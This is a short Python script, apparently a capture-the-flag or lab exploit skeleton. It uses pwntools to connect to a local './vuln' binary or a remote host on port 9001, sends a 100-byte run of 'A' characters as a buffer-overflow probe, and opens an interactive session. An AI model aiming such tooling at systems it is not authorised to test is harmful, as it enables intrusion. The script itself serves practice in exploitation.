from pwn import process, remote
import argparse

PORT = 9001
BFO_PAYLOAD = b"A" * 100


def access(local, file, host):
    if local:
        return process(file)
    else:
        return remote(host, PORT)


def main():
    parser = argparse.ArgumentParser(description="Exploit tool using pwntools")
    parser.add_argument("--local", action="store_true",
                        help="Run exploit locally instead of remotely")
    parser.add_argument("-f", "--file", type=str,
                        default="./vuln", help="Path to local binary")
    parser.add_argument("-H", "--host", type=str, default="127.0.0.1",
                        help="Target host for remote connection")

    args = parser.parse_args()

    if not args.local and not args.host:
        parser.error("Remote mode requires a --host")

    ps = access(args.local, args.file, args.host)
    ps.sendline(BFO_PAYLOAD)
    ps.interactive()


if __name__ == "__main__":
    main()
